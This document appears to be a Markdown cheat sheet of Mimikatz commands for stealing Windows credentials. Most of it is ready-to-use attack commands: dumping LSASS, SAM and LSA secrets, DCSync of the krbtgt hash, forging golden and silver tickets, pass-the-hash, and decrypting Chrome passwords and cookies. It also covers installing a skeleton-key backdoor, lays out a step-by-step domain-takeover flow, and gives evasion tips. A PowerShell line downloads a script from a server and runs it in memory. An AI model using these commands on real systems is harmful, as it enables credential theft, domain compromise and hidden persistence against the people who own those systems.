# <span style="color:rgb(255, 192, 0)">Mimikatz - Complete Command Reference</span>

Mimikatz by Benjamin Delpy (@gentilkiwi) is the de facto tool for Windows credential extraction. It operates in-memory to extract plaintext passwords, hashes, Kerberos tickets, DPAPI keys, and more.

**Load**: `mimikatz.exe` | **Remote load**: `Invoke-Mimikatz` (PowerShell) | **Debug**: `privilege::debug`

---

## <span style="color:rgb(255, 0, 0)">1. Privilege Module</span>

```mimikatz
privilege::debug
```
- Enables `SeDebugPrivilege` for the current process
- **Must be run first** before almost any other command
- If it returns `20` → OK, `0` or error → not running as admin

```mimikatz
token::elevate
```
- Elevate from admin to SYSTEM token (impersonate)
- Required when current process token lacks certain access

```mimikatz
token::revert
```
- Revert back to original token after elevation

```mimikatz
!processprotect /process:lsass.exe /remove
```
- Remove PPL (Protected Process Light) from lsass.exe
- Required when LSA Protection (RunAsPPL) is enabled
- **Needs** driver (`mimidrv.sys`) loaded first: `!+`

---

## <span style="color:rgb(0, 176, 240)">2. Sekurlsa Module (LSASS Memory)</span>

### sekurlsa::logonpasswords
```mimikatz
sekurlsa::logonpasswords
```
- Dumps all currently logged-on session credentials from LSASS
- Extracts: NTLM, SHA1, plaintext (if WDigest enabled), Kerberos tickets, DPAPI keys
- **OPSEC**: Very noisy; triggers 4688 (process creation) and EDR hooks on LSASS

### sekurlsa::msv
```mimikatz
sekurlsa::msv
```
- Dumps only MSV1_0 authentication package credentials
- NTLM hashes for all logon sessions
- Less verbose than `logonpasswords`, faster

### sekurlsa::ekeys
```mimikatz
sekurlsa::ekeys
```
- Dumps Kerberos encryption keys (AES128, AES256, RC4_HMAC, DES)
- Useful for Kerberos attacks (overpass-the-hash, golden/silver tickets)
- AES keys are especially valuable for modern environments

### sekurlsa::tickets /export
```mimikatz
sekurlsa::tickets /export
```
- Exports all Kerberos tickets from memory as `.kirbi` files
- Each ticket saved as `[session][user]@[service]-[target].kirbi`
- Can be used for pass-the-ticket attacks

### sekurlsa::pth
```mimikatz
sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:<NTLM_HASH> /run:cmd.exe
```
- Pass-the-Hash: Creates a new process with the given user's NTLM hash
- Spawns `cmd.exe` (or any binary) with the impersonated credentials
- **OPSEC**: New process creation (4688) with the target user's token

```mimikatz
sekurlsa::pth /user:Administrator /domain:contoso.local /aes256:<AES256_KEY> /run:powershell.exe
```
- Pass-the-Key version using AES256 key instead of NTLM

### sekurlsa::minidump
```mimikatz
sekurlsa::minidump lsass.dmp
```
- Loads an offline LSASS dump file for analysis
- Follow with `sekurlsa::logonpasswords` to parse the dump
- **OPSEC**: No network traffic; completely offline analysis

```mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## <span style="color:rgb(146, 208, 80)">3. LSADump Module (LSA, SAM, DC)</span>

### lsadump::sam
```mimikatz
lsadump::sam
```
- Dumps local SAM database (local user hashes)
- Requires SYSTEM privileges
- Reads from registry: `HKLM\SAM\SAM`

```mimikatz
lsadump::sam /sam:SAM.hiv /system:SYSTEM.hiv
```
- Offline SAM dump using saved registry hives

### lsadump::secrets
```mimikatz
lsadump::secrets
```
- Dumps LSA secrets from registry
- Contains: service account plaintext passwords, cached domain credentials, DPAPI keys, auto-logon credentials
- Requires SYSTEM

```mimikatz
lsadump::secrets /security:SECURITY.hiv /system:SYSTEM.hiv
```
- Offline LSA secrets extraction

### lsadump::cache
```mimikatz
lsadump::cache
```
- Dumps cached domain credentials (MSCache v2)
- Limited to `CachedLogonsCount` (default 10) from `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- Hashes are salted and can be cracked offline with `john` or `hashcat`

### lsadump::dcsync
```mimikatz
lsadump::dcsync /domain:contoso.local /user:krbtgt
```
- DCSync: Replicates a single user's credentials from the DC
- Acts as a domain controller requesting DRSUAPI replication
- Extracts all credential material (NTLM, AES keys) for the target user

```mimikatz
lsadump::dcsync /domain:contoso.local /all /csv
```
- DCSync ALL users in CSV format
- **OPSEC**: Very loud; triggers 4662 (Directory Service Access) replication events
- **Requires**: Domain admin / Enterprise admin / or delegated replication rights

```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator
```

---

## <span style="color:rgb(112, 48, 160)">4. Kerberos Module</span>

### kerberos::golden
```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt
```
- Forge a Golden Ticket (TGT) using the krbtgt hash
- `/ptt` → injects directly into current session
- `/ticket:ticket.kirbi` → saves to file instead
- `/groups:500,501,502,512,513,518,519` → specify group SIDs
- `/id:500` → specify user RID (500 = Administrator)
- **OPSEC**: Golden tickets are valid for duration of krbtgt password age (default 1 year)

```mimikatz
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /aes256:<AES256_KEY> /ptt
```
- Golden Ticket with AES256 key (encryption type 18)

```mimikatz
kerberos::golden /user:Admin /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:HASH /sids:S-1-5-21-YYYY-512 /ptt
```
- Extra SID injection for cross-forest trust attacks

### kerberos::silver
```mimikatz
kerberos::silver /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /target:DC01.contoso.local /service:cifs /rc4:<HASH> /ptt
```
- Forge a Silver Ticket (service ticket) for a specific service
- `/service:cifs` → file share access
- `/service:ldap` → LDAP queries
- `/service:http` → web access
- `/service:host` → schedule tasks / WinRM
- `/service:rpcss` → RPC

### kerberos::ptt
```mimikatz
kerberos::ptt ticket.kirbi
```
- Pass-the-Ticket: Inject a `.kirbi` ticket into the current session
- Can be used with exported tickets from `sekurlsa::tickets /export`

```mimikatz
kerberos::ptt C:\temp\golden.kirbi
```

---

## <span style="color:rgb(0, 32, 96)">5. Vault & DPAPI Modules</span>

### vault::cred /patch
```mimikatz
vault::cred /patch
```
- Enumerate and patch Windows Credential Manager vaults
- Extracts saved credentials (RDP, web, app credentials)
- **OPSEC**: Trighes Windows Vault read operations

### dpapi::masterkey
```mimikatz
dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\FILE /sid:S-1-5-21-XXXX /password:PASS
```
- Decrypt a DPAPI masterkey file with user's password
- Masterkeys are used to decrypt all DPAPI-protected data

```mimikatz
dpapi::masterkey /in:FILE /sid:S-1-5-21-XXXX /rpc
```
- Use domain DPAPI backup key via RPC (requires domain admin)

### dpapi::chrome
```mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```
- Decrypt Chrome saved passwords using DPAPI
- Extracts: URL, username, password from Chrome's SQLite database

```mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
```
- Decrypt Chrome cookies

```mimikatz
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /masterkey:KEY
```
- Decrypt Chrome passwords with a known masterkey

### dpapi::capi
```mimikatz
dpapi::capi /in:"CERT_FILE"
```
- Decrypt CAPI (Crypto API) private keys

### dpapi::protect
```mimikatz
dpapi::protect /unprotect /data:ENCRYPTED_DATA
```

---

## <span style="color:rgb(94, 18, 18)">6. Crypto Module</span>

### crypto::certificates /export
```mimikatz
crypto::certificates /export
```
- Exports all certificates from the local machine store and user store
- Exports private keys when extractable
- Saved as `.pfx` or `.der` files

```mimikatz
crypto::certificates /export /systemstore:LOCAL_MACHINE
```
- Export machine store certificates

```mimikatz
crypto::certificates /export /systemstore:MY /store:CURRENTUSER
```

---

## <span style="color:rgb(255, 255, 0)">7. Misc Module</span>

### misc::skeleton
```mimikatz
misc::skeleton
```
- Injects a skeleton key (backdoor) into the domain
- Any user can authenticate with password "mimikatz" (default)
- **Requires**: Domain admin access to a DC
- **Persistence**: Survives until LSASS restart (reboot clears it)
- **Detection**: Largely detected by modern EDR; LSASS modification alerts

```mimikatz
misc::skeleton /password:CustomBackdoorPass
```
- Use a custom skeleton key password instead of default

---

## <span style="color:rgb(0, 176, 240)">8. Standard Attack Flow</span>

```mimikatz
# Step 1: Get debug privilege
privilege::debug

# Step 2: Elevate to SYSTEM
token::elevate

# Step 3: Dump credentials
sekurlsa::logonpasswords

# Step 4: Dump SAM (local hashes)
lsadump::sam

# Step 5: Dump LSA secrets
lsadump::secrets

# Step 6: Export Kerberos tickets
sekurlsa::tickets /export

# Step 7: DCSync krbtgt hash (if DA on DC)
lsadump::dcsync /domain:contoso.local /user:krbtgt

# Step 8: Forge golden ticket
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-XXXX /krbtgt:HASH /ptt

# Step 9: Verify access with directory listing
dir \\DC01\C$
```

---

## <span style="color:rgb(255, 112, 112)">OPSEC Notes</span>

| Concern | Detail |
|---------|--------|
| AV/EDR | Mimikatz is heavily signatured; use obfuscated builds, AMSI bypass, .NET reflection |
| Logging | 4688 (process creation) with Mimikatz command line |
| LSASS Hooks | EDR hooks on LSASS → `sekurlsa::*` will be detected |
| Protected Process | LSA Protection blocks LSASS reads; need `!processprotect /remove` + driver |
| Credential Guard | Virtualization-based security blocks all LSASS reads; use key extraction via `ekeys` instead |
| Network | DCSync generates clear replication traffic on port 389/636 |
| Memory Scanning | Even obfuscated Mimikatz can be found by heap scanning |

**Detection Events**:
- 4688: Process creation (mimikatz.exe)
- 4663: LSASS handle request
- 4670: LSASS process manipulation
- 4662: Directory Service Access (DCSync)
- 4624: Logon with injected credentials (pth)

---

## <span style="color:rgb(0, 176, 240)">PowerShell Invoke-Mimikatz</span>

```powershell
# Load from memory (bypasses disk AV)
IEX (New-Object Net.WebClient).DownloadString('http://SERVER/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Dump credentials from remote system
Invoke-Mimikatz -ComputerName DC01

# Dump specific items
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
```

---

## <span style="color:rgb(146, 208, 80)">Common Errors & Fixes</span>

| Error | Cause | Fix |
|-------|-------|-----|
| "ERROR kuhl_m_privilege_simple" | Not running as admin | Run as Administrator |
| "ERROR kuhl_m_sekurlsa_acquireLSA" | LSA Protection enabled | Load driver + `!processprotect /remove` |
| "ERROR kuhl_m_lsadump_dcsync" | No replication rights | Need DA/EA or delegated rights |
| "20" not returned by `privilege::debug` | Missing SeDebug | Already covered by admin |
| Credential Guard blocks | VBS enabled | Cannot dump; use `ekeys` as alternative |
